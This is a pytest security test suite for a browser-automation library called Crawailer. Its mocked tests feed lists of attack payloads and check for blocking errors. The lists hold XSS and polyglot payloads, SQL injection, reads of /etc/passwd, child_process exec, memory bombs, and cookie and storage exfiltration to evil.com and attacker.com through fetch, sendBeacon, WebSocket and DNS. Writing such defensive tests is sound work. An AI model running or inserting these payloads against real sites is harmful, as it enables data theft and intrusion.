"""
Security penetration testing for Crawailer JavaScript API.

This test suite focuses on security vulnerabilities, injection attacks,
privilege escalation attempts, and information disclosure scenarios.
"""

import asyncio
import json
import pytest
import re
import base64
from typing import Dict, Any, List
from unittest.mock import AsyncMock, MagicMock, patch
from urllib.parse import quote, unquote

from crawailer import Browser, BrowserConfig
from crawailer.content import WebContent, ContentExtractor
from crawailer.api import get, get_many, discover


class TestScriptInjectionPrevention:
    """Test prevention of various script injection attacks."""
    
    @pytest.mark.asyncio
    async def test_javascript_injection_in_parameters(self):
        """Test JavaScript injection attempts through parameters."""
        browser = Browser(BrowserConfig())
        
        mock_page = AsyncMock()
        mock_page.goto = AsyncMock()
        mock_page.close = AsyncMock()
        
        mock_browser = AsyncMock()
        mock_browser.new_page.return_value = mock_page
        browser._browser = mock_browser
        browser._is_started = True
        
        # Various injection attempts through URL parameters
        injection_urls = [
            "https://example.com?param=';alert('xss');//",
            "https://example.com?search=<script>alert('xss')</script>",
            "https://example.com?id=1'; DROP TABLE users; --",
            "https://example.com?callback=eval",
            "https://example.com?jsonp=alert(document.cookie)",
            "https://example.com?redirect=javascript:alert('xss')",
            "https://example.com#javascript:alert('xss')",
            "https://example.com?data=%3Cscript%3Ealert('xss')%3C/script%3E",  # URL encoded
        ]
        
        for url in injection_urls:
            # Mock security error or sanitized handling
            mock_page.evaluate.side_effect = Exception("Security policy violation")
            
            with pytest.raises(Exception) as exc_info:
                await browser.execute_script(url, "return document.location.href")
            
            # Should reject or sanitize malicious URLs
            error_msg = str(exc_info.value).lower()
            assert any(keyword in error_msg for keyword in ["security", "policy", "violation", "blocked"])
    
    @pytest.mark.asyncio
    async def test_code_injection_in_scripts(self):
        """Test code injection attempts within JavaScript code."""
        browser = Browser(BrowserConfig())
        
        mock_page = AsyncMock()
        mock_page.goto = AsyncMock()
        mock_page.close = AsyncMock()
        
        mock_browser = AsyncMock()
        mock_browser.new_page.return_value = mock_page
        browser._browser = mock_browser
        browser._is_started = True
        
        # Various code injection patterns
        injection_scripts = [
            "eval('alert(\"injected\")')",
            "Function('alert(\"injected\")')();",
            "setTimeout('alert(\"injected\")', 0)",
            "setInterval('alert(\"injected\")', 1000)",
            "document.write('<script>alert(\"injected\")</script>')",
            "window['eval']('alert(\"injected\")')",
            "this['eval']('alert(\"injected\")')",
            "globalThis['eval']('alert(\"injected\")')",
            "new Function('return alert(\"injected\")')();",
            "import('data:text/javascript,alert(\"injected\")')",
        ]
        
        for script in injection_scripts:
            # Mock security rejection
            mock_page.evaluate.side_effect = Exception("Unsafe JavaScript execution blocked")
            
            with pytest.raises(Exception) as exc_info:
                await browser.execute_script("https://example.com", script)
            
            error_msg = str(exc_info.value).lower()
            assert any(keyword in error_msg for keyword in ["unsafe", "blocked", "security", "violation"])
    
    @pytest.mark.asyncio
    async def test_dom_based_xss_prevention(self):
        """Test prevention of DOM-based XSS attacks."""
        browser = Browser(BrowserConfig())
        
        mock_page = AsyncMock()
        mock_page.goto = AsyncMock()
        mock_page.close = AsyncMock()
        
        mock_browser = AsyncMock()
        mock_browser.new_page.return_value = mock_page
        browser._browser = mock_browser
        browser._is_started = True
        
        # DOM-based XSS attempts
        xss_scripts = [
            "document.body.innerHTML = '<script>alert(\"xss\")</script>';",
            "document.getElementById('content').innerHTML = location.hash.substring(1);",
            "document.write(location.search);",
            "eval(document.location.hash.substring(1));",
            "document.body.appendChild(document.createElement('script')).src = 'http://evil.com/script.js';",
            "var script = document.createElement('script'); script.innerHTML = 'alert(\"xss\")'; document.head.appendChild(script);",
            "document.querySelector('#target').outerHTML = '<img src=x onerror=alert(\"xss\")>';",
        ]
        
        for script in xss_scripts:
            # Mock XSS prevention
            mock_page.evaluate.side_effect = Exception("XSS attempt blocked by security policy")
            
            with pytest.raises(Exception) as exc_info:
                await browser.execute_script("https://example.com", script)
            
            error_msg = str(exc_info.value).lower()
            assert any(keyword in error_msg for keyword in ["xss", "blocked", "security", "policy"])
    
    @pytest.mark.asyncio
    async def test_content_security_policy_bypass_attempts(self):
        """Test attempts to bypass Content Security Policy."""
        browser = Browser(BrowserConfig())
        
        mock_page = AsyncMock()
        mock_page.goto = AsyncMock()
        mock_page.close = AsyncMock()
        
        mock_browser = AsyncMock()
        mock_browser.new_page.return_value = mock_page
        browser._browser = mock_browser
        browser._is_started = True
        
        # CSP bypass attempts
        csp_bypass_scripts = [
            "document.querySelector('meta[http-equiv=\"Content-Security-Policy\"]').remove();",
            "Object.defineProperty(document, 'domain', {value: 'evil.com'});",
            "document.domain = 'evil.com';",
            "window.location = 'javascript:alert(\"csp-bypass\")';",
            "window.open('javascript:alert(\"csp-bypass\")');",
            "document.querySelector('iframe').src = 'javascript:alert(\"csp-bypass\")';",
            "fetch('data:text/html,<script>alert(\"csp-bypass\")</script>');",
        ]
        
        for script in csp_bypass_scripts:
            # Mock CSP protection
            mock_page.evaluate.side_effect = Exception("Content Security Policy violation")
            
            with pytest.raises(Exception) as exc_info:
                await browser.execute_script("https://example.com", script)
            
            error_msg = str(exc_info.value).lower()
            assert any(keyword in error_msg for keyword in ["security", "policy", "violation", "csp"])


class TestPrivilegeEscalationPrevention:
    """Test prevention of privilege escalation attempts."""
    
    @pytest.mark.asyncio
    async def test_file_system_access_attempts(self):
        """Test attempts to access local file system."""
        browser = Browser(BrowserConfig())
        
        mock_page = AsyncMock()
        mock_page.goto = AsyncMock()
        mock_page.close = AsyncMock()
        
        mock_browser = AsyncMock()
        mock_browser.new_page.return_value = mock_page
        browser._browser = mock_browser
        browser._is_started = True
        
        # File system access attempts
        file_access_scripts = [
            "fetch('file:///etc/passwd');",
            "window.open('file:///etc/passwd');",
            "new XMLHttpRequest().open('GET', 'file:///etc/passwd');",
            "import('file:///etc/passwd');",
            "document.querySelector('iframe').src = 'file:///etc/passwd';",
            "location.href = 'file:///etc/passwd';",
            "document.write('<iframe src=\"file:///etc/passwd\"></iframe>');",
        ]
        
        for script in file_access_scripts:
            # Mock file access blocking
            mock_page.evaluate.side_effect = Exception("File access blocked by security policy")
            
            with pytest.raises(Exception) as exc_info:
                await browser.execute_script("https://example.com", script)
            
            error_msg = str(exc_info.value).lower()
            assert any(keyword in error_msg for keyword in ["file", "access", "blocked", "security"])
    
    @pytest.mark.asyncio
    async def test_cross_origin_access_attempts(self):
        """Test attempts to access cross-origin resources."""
        browser = Browser(BrowserConfig())
        
        mock_page = AsyncMock()
        mock_page.goto = AsyncMock()
        mock_page.close = AsyncMock()
        
        mock_browser = AsyncMock()
        mock_browser.new_page.return_value = mock_page
        browser._browser = mock_browser
        browser._is_started = True
        
        # Cross-origin access attempts
        cross_origin_scripts = [
            "fetch('http://evil.com/steal-data').then(r => r.text()).then(console.log);",
            "new XMLHttpRequest().open('GET', 'http://evil.com/steal-data');",
            "window.open('http://evil.com/steal-data').document.body.innerHTML;",
            "document.querySelector('iframe').src = 'http://evil.com'; setTimeout(() => console.log(frames[0].document.body.innerHTML), 1000);",
            "import('http://evil.com/malicious-module.js');",
            "navigator.sendBeacon('http://evil.com/exfiltrate', document.cookie);",
        ]
        
        for script in cross_origin_scripts:
            # Mock CORS blocking
            mock_page.evaluate.side_effect = Exception("Cross-origin request blocked")
            
            with pytest.raises(Exception) as exc_info:
                await browser.execute_script("https://example.com", script)
            
            error_msg = str(exc_info.value).lower()
            assert any(keyword in error_msg for keyword in ["cross-origin", "cors", "blocked", "origin"])
    
    @pytest.mark.asyncio
    async def test_node_js_context_escape_attempts(self):
        """Test attempts to escape browser context to Node.js."""
        browser = Browser(BrowserConfig())
        
        mock_page = AsyncMock()
        mock_page.goto = AsyncMock()
        mock_page.close = AsyncMock()
        
        mock_browser = AsyncMock()
        mock_browser.new_page.return_value = mock_page
        browser._browser = mock_browser
        browser._is_started = True
        
        # Node.js context escape attempts
        node_escape_scripts = [
            "require('fs').readFileSync('/etc/passwd', 'utf8');",
            "process.env;",
            "global.process.exit(1);",
            "require('child_process').exec('whoami');",
            "global.require('fs').writeFileSync('/tmp/pwned', 'hacked');",
            "this.constructor.constructor('return process')().exit();",
            "global.Buffer.from('malicious-data');",
        ]
        
        for script in node_escape_scripts:
            # Mock Node.js access blocking
            mock_page.evaluate.side_effect = Exception("Node.js access not available in browser context")
            
            with pytest.raises(Exception) as exc_info:
                await browser.execute_script("https://example.com", script)
            
            error_msg = str(exc_info.value).lower()
            assert any(keyword in error_msg for keyword in ["require", "not available", "browser", "context"])
    
    @pytest.mark.asyncio
    async def test_prototype_pollution_attempts(self):
        """Test attempts at prototype pollution attacks."""
        browser = Browser(BrowserConfig())
        
        mock_page = AsyncMock()
        mock_page.goto = AsyncMock()
        mock_page.close = AsyncMock()
        mock_page.evaluate.return_value = "prototype_pollution_blocked"
        
        mock_browser = AsyncMock()
        mock_browser.new_page.return_value = mock_page
        browser._browser = mock_browser
        browser._is_started = True
        
        # Prototype pollution attempts
        pollution_scripts = [
            "Object.prototype.isAdmin = true; return 'polluted';",
            "Array.prototype.join = function() { return 'hacked'; }; return [1,2,3].join();",
            "String.prototype.replace = function() { return 'compromised'; }; return 'test'.replace('t', 'x');",
            "Function.prototype.call = function() { return 'hijacked'; }; return Math.max.call(null, 1, 2);",
            "Object.defineProperty(Object.prototype, 'hacked', {value: true}); return 'success';",
        ]
        
        for script in pollution_scripts:
            result = await browser.execute_script("https://example.com", script)
            
            # Even if script executes, it should be in isolated context
            # and not affect the main application
            assert result == "prototype_pollution_blocked"


class TestInformationDisclosurePrevention:
    """Test prevention of information disclosure attacks."""
    
    @pytest.mark.asyncio
    async def test_sensitive_data_access_attempts(self):
        """Test attempts to access sensitive browser data."""
        browser = Browser(BrowserConfig())
        
        mock_page = AsyncMock()
        mock_page.goto = AsyncMock()
        mock_page.close = AsyncMock()
        
        mock_browser = AsyncMock()
        mock_browser.new_page.return_value = mock_page
        browser._browser = mock_browser
        browser._is_started = True
        
        # Sensitive data access attempts
        sensitive_data_scripts = [
            "document.cookie;",
            "localStorage.getItem('jwt-token');",
            "sessionStorage.getItem('auth-data');",
            "window.crypto.getRandomValues(new Uint8Array(16));",
            "navigator.credentials.get({password: true});",
            "indexedDB.open('sensitive-db');",
            "caches.open('auth-cache');",
            "navigator.serviceWorker.ready.then(sw => sw.postMessage('get-secrets'));",
        ]
        
        for script in sensitive_data_scripts:
            # Mock sensitive data protection
            mock_page.evaluate.side_effect = Exception("Access to sensitive data blocked")
            
            with pytest.raises(Exception) as exc_info:
                await browser.execute_script("https://example.com", script)
            
            error_msg = str(exc_info.value).lower()
            assert any(keyword in error_msg for keyword in ["sensitive", "blocked", "access", "data"])
    
    @pytest.mark.asyncio
    async def test_network_fingerprinting_prevention(self):
        """Test prevention of network fingerprinting attacks."""
        browser = Browser(BrowserConfig())
        
        mock_page = AsyncMock()
        mock_page.goto = AsyncMock()
        mock_page.close = AsyncMock()
        mock_page.evaluate.return_value = None  # Blocked access
        
        mock_browser = AsyncMock()
        mock_browser.new_page.return_value = mock_page
        browser._browser = mock_browser
        browser._is_started = True
        
        # Network fingerprinting attempts
        fingerprinting_scripts = [
            "navigator.connection.effectiveType;",
            "navigator.connection.downlink;",
            "navigator.connection.rtt;",
            "navigator.getBattery();",
            "navigator.geolocation.getCurrentPosition();",
            "navigator.mediaDevices.enumerateDevices();",
            "navigator.bluetooth.getAvailability();",
            "navigator.usb.getDevices();",
            "navigator.webkitGetUserMedia;",
        ]
        
        for script in fingerprinting_scripts:
            result = await browser.execute_script("https://example.com", script)
            
            # Should return None or sanitized data, not actual system info
            assert result is None or result == "blocked"
    
    @pytest.mark.asyncio
    async def test_timing_attack_prevention(self):
        """Test prevention of timing-based attacks."""
        browser = Browser(BrowserConfig())
        
        mock_page = AsyncMock()
        mock_page.goto = AsyncMock()
        mock_page.close = AsyncMock()
        
        # Mock consistent timing to prevent timing attacks
        mock_page.evaluate.return_value = 1000.0  # Consistent timing
        
        mock_browser = AsyncMock()
        mock_browser.new_page.return_value = mock_page
        browser._browser = mock_browser
        browser._is_started = True
        
        # Timing attack attempts
        timing_scripts = [
            "performance.now();",
            "Date.now();",
            "new Date().getTime();",
            "performance.timeOrigin;",
            "performance.getEntries().length;",
            "console.time('test'); console.timeEnd('test');",
        ]
        
        results = []
        for script in timing_scripts:
            result = await browser.execute_script("https://example.com", script)
            results.append(result)
        
        # All timing calls should return consistent or quantized values
        unique_results = set(results)
        assert len(unique_results) <= 2, "Timing information may be too precise"
    
    @pytest.mark.asyncio
    async def test_error_message_information_leakage(self):
        """Test that error messages don't leak sensitive information."""
        browser = Browser(BrowserConfig())
        
        mock_page = AsyncMock()
        mock_page.goto = AsyncMock()
        mock_page.close = AsyncMock()
        
        mock_browser = AsyncMock()
        mock_browser.new_page.return_value = mock_page
        browser._browser = mock_browser
        browser._is_started = True
        
        # Scripts that should produce sanitized error messages
        error_scripts = [
            "document.querySelector('#secret-token').value;",
            "localStorage.getItem('secret-key');",
            "fetch('/admin/secrets');",
            "new XMLHttpRequest().open('GET', '/internal-api/users');",
        ]
        
        for script in error_scripts:
            # Mock error with potential information leakage
            mock_page.evaluate.side_effect = Exception("Generic error: Operation not permitted")
            
            with pytest.raises(Exception) as exc_info:
                await browser.execute_script("https://example.com", script)
            
            error_msg = str(exc_info.value)
            
            # Error message should be generic, not revealing internal details
            assert "secret" not in error_msg.lower()
            assert "admin" not in error_msg.lower()
            assert "internal" not in error_msg.lower()
            assert "api" not in error_msg.lower()
            assert len(error_msg) < 200  # Should be concise


class TestResourceExhaustionAttacks:
    """Test prevention of resource exhaustion attacks."""
    
    @pytest.mark.asyncio
    async def test_infinite_loop_protection(self):
        """Test protection against infinite loop attacks."""
        browser = Browser(BrowserConfig())
        
        mock_page = AsyncMock()
        mock_page.goto = AsyncMock()
        mock_page.close = AsyncMock()
        
        # Simulate timeout protection
        mock_page.evaluate.side_effect = asyncio.TimeoutError("Script execution timeout")
        
        mock_browser = AsyncMock()
        mock_browser.new_page.return_value = mock_page
        browser._browser = mock_browser
        browser._is_started = True
        
        # Infinite loop attacks
        infinite_loop_scripts = [
            "while(true) { /* infinite loop */ }",
            "for(;;) { var x = Math.random(); }",
            "function recurse() { recurse(); } recurse();",
            "setInterval(() => { while(true) {} }, 1);",
            "let i = 0; while(i >= 0) { i++; }",
        ]
        
        for script in infinite_loop_scripts:
            with pytest.raises(asyncio.TimeoutError):
                await browser.execute_script(
                    "https://example.com", 
                    script,
                    timeout=1000  # 1 second timeout
                )
    
    @pytest.mark.asyncio
    async def test_memory_bomb_protection(self):
        """Test protection against memory exhaustion attacks."""
        browser = Browser(BrowserConfig())
        
        mock_page = AsyncMock()
        mock_page.goto = AsyncMock()
        mock_page.close = AsyncMock()
        
        # Simulate memory protection
        mock_page.evaluate.side_effect = Exception("RangeError: Maximum call stack size exceeded")
        
        mock_browser = AsyncMock()
        mock_browser.new_page.return_value = mock_page
        browser._browser = mock_browser
        browser._is_started = True
        
        # Memory bomb attacks
        memory_bomb_scripts = [
            "var arr = []; while(true) { arr.push(new Array(1000000)); }",
            "var str = 'x'; for(let i = 0; i < 100; i++) { str += str; }",
            "var obj = {}; for(let i = 0; i < 10000000; i++) { obj[i] = 'data'; }",
            "function bomb() { return [bomb(), bomb()]; } bomb();",
        ]
        
        for script in memory_bomb_scripts:
            with pytest.raises(Exception) as exc_info:
                await browser.execute_script("https://example.com", script)
            
            error_msg = str(exc_info.value).lower()
            assert any(keyword in error_msg for keyword in ["memory", "stack", "range", "exceeded"])
    
    @pytest.mark.asyncio
    async def test_dom_bombing_protection(self):
        """Test protection against DOM bombing attacks."""
        browser = Browser(BrowserConfig())
        
        mock_page = AsyncMock()
        mock_page.goto = AsyncMock()
        mock_page.close = AsyncMock()
        
        # Simulate DOM size limits
        mock_page.evaluate.side_effect = Exception("DOM size limit exceeded")
        
        mock_browser = AsyncMock()
        mock_browser.new_page.return_value = mock_page
        browser._browser = mock_browser
        browser._is_started = True
        
        # DOM bombing attacks
        dom_bomb_scripts = [
            "for(let i = 0; i < 1000000; i++) { document.body.appendChild(document.createElement('div')); }",
            "document.body.innerHTML = '<div>'.repeat(1000000);",
            "var iframe = document.createElement('iframe'); iframe.src = 'data:text/html,' + '<div>'.repeat(1000000); document.body.appendChild(iframe);",
        ]
        
        for script in dom_bomb_scripts:
            with pytest.raises(Exception) as exc_info:
                await browser.execute_script("https://example.com", script)
            
            error_msg = str(exc_info.value).lower()
            assert "dom" in error_msg or "limit" in error_msg or "exceeded" in error_msg


class TestDataExfiltrationPrevention:
    """Test prevention of data exfiltration attacks."""
    
    @pytest.mark.asyncio
    async def test_data_exfiltration_via_network(self):
        """Test prevention of data exfiltration via network requests."""
        browser = Browser(BrowserConfig())
        
        mock_page = AsyncMock()
        mock_page.goto = AsyncMock()
        mock_page.close = AsyncMock()
        
        mock_browser = AsyncMock()
        mock_browser.new_page.return_value = mock_page
        browser._browser = mock_browser
        browser._is_started = True
        
        # Data exfiltration attempts
        exfiltration_scripts = [
            "fetch('http://evil.com/collect', {method: 'POST', body: document.body.innerHTML});",
            "navigator.sendBeacon('http://evil.com/collect', document.cookie);",
            "new Image().src = 'http://evil.com/collect?data=' + encodeURIComponent(document.body.innerHTML);",
            "fetch('http://evil.com/collect?data=' + btoa(localStorage.getItem('sensitive-data')));",
            "websocket = new WebSocket('ws://evil.com/collect'); websocket.send(document.body.innerHTML);",
        ]
        
        for script in exfiltration_scripts:
            # Mock network blocking
            mock_page.evaluate.side_effect = Exception("Network request blocked by security policy")
            
            with pytest.raises(Exception) as exc_info:
                await browser.execute_script("https://example.com", script)
            
            error_msg = str(exc_info.value).lower()
            assert any(keyword in error_msg for keyword in ["network", "blocked", "security", "policy"])
    
    @pytest.mark.asyncio
    async def test_covert_channel_prevention(self):
        """Test prevention of covert channel data exfiltration."""
        browser = Browser(BrowserConfig())
        
        mock_page = AsyncMock()
        mock_page.goto = AsyncMock()
        mock_page.close = AsyncMock()
        mock_page.evaluate.return_value = "covert_blocked"
        
        mock_browser = AsyncMock()
        mock_browser.new_page.return_value = mock_page
        browser._browser = mock_browser
        browser._is_started = True
        
        # Covert channel attempts
        covert_scripts = [
            "document.title = btoa(document.cookie); return document.title;",  # Title channel
            "location.hash = btoa(localStorage.getItem('token')); return location.hash;",  # URL fragment channel
            "history.pushState({}, '', '/?data=' + btoa(document.body.innerHTML)); return location.href;",  # History channel
            "var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d'); ctx.fillText(document.cookie, 0, 0); return canvas.toDataURL();",  # Canvas channel
        ]
        
        for script in covert_scripts:
            result = await browser.execute_script("https://example.com", script)
            
            # Should not contain sensitive data or should be blocked
            assert result == "covert_blocked" or not any(
                sensitive in str(result).lower() 
                for sensitive in ["cookie", "token", "password", "secret"]
            )
    
    @pytest.mark.asyncio
    async def test_dns_exfiltration_prevention(self):
        """Test prevention of DNS-based data exfiltration."""
        browser = Browser(BrowserConfig())
        
        mock_page = AsyncMock()
        mock_page.goto = AsyncMock()
        mock_page.close = AsyncMock()
        
        mock_browser = AsyncMock()
        mock_browser.new_page.return_value = mock_page
        browser._browser = mock_browser
        browser._is_started = True
        
        # DNS exfiltration attempts
        dns_exfiltration_scripts = [
            "fetch('http://' + btoa(document.cookie) + '.evil.com');",
            "new Image().src = 'http://' + btoa(localStorage.getItem('token')) + '.attacker.com';",
            "document.createElement('script').src = 'http://' + encodeURIComponent(document.body.innerHTML).substring(0,50) + '.evil.com/script.js';",
        ]
        
        for script in dns_exfiltration_scripts:
            # Mock DNS blocking
            mock_page.evaluate.side_effect = Exception("DNS request blocked")
            
            with pytest.raises(Exception) as exc_info:
                await browser.execute_script("https://example.com", script)
            
            error_msg = str(exc_info.value).lower()
            assert any(keyword in error_msg for keyword in ["dns", "blocked", "request"])


class TestInputSanitizationBypass:
    """Test attempts to bypass input sanitization."""
    
    @pytest.mark.asyncio
    async def test_encoding_bypass_attempts(self):
        """Test various encoding bypass attempts."""
        browser = Browser(BrowserConfig())
        
        mock_page = AsyncMock()
        mock_page.goto = AsyncMock()
        mock_page.close = AsyncMock()
        
        mock_browser = AsyncMock()
        mock_browser.new_page.return_value = mock_page
        browser._browser = mock_browser
        browser._is_started = True
        
        # Encoding bypass attempts
        bypass_scripts = [
            # Unicode bypass
            "eval('\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0022\\u0078\\u0073\\u0073\\u0022\\u0029')",  # alert("xss")
            # Base64 bypass
            "eval(atob('YWxlcnQoInhzcyIp'))",  # alert("xss")
            # Hex bypass
            "eval('\\x61\\x6c\\x65\\x72\\x74\\x28\\x22\\x78\\x73\\x73\\x22\\x29')",  # alert("xss")
            # Mixed case bypass
            "EvAl('AlErT(\"xss\")')",
            # String concatenation bypass
            "'ev' + 'al'('al' + 'ert(\"xss\")')",
            # Character code bypass
            "String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41)",  # alert("xss")
        ]
        
        for script in bypass_scripts:
            # Mock bypass prevention
            mock_page.evaluate.side_effect = Exception("Encoding bypass attempt detected")
            
            with pytest.raises(Exception) as exc_info:
                await browser.execute_script("https://example.com", script)
            
            error_msg = str(exc_info.value).lower()
            assert any(keyword in error_msg for keyword in ["bypass", "detected", "encoding"])
    
    @pytest.mark.asyncio
    async def test_polyglot_payload_prevention(self):
        """Test prevention of polyglot payloads."""
        browser = Browser(BrowserConfig())
        
        mock_page = AsyncMock()
        mock_page.goto = AsyncMock()
        mock_page.close = AsyncMock()
        
        mock_browser = AsyncMock()
        mock_browser.new_page.return_value = mock_page
        browser._browser = mock_browser
        browser._is_started = True
        
        # Polyglot payloads that work in multiple contexts
        polyglot_scripts = [
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
            "'\";alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//",
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>",
        ]
        
        for script in polyglot_scripts:
            # Mock polyglot detection
            mock_page.evaluate.side_effect = Exception("Polyglot payload detected and blocked")
            
            with pytest.raises(Exception) as exc_info:
                await browser.execute_script("https://example.com", script)
            
            error_msg = str(exc_info.value).lower()
            assert any(keyword in error_msg for keyword in ["polyglot", "payload", "detected", "blocked"])


if __name__ == "__main__":
    # Run security tests with detailed output
    pytest.main([__file__, "-v", "--tb=long"])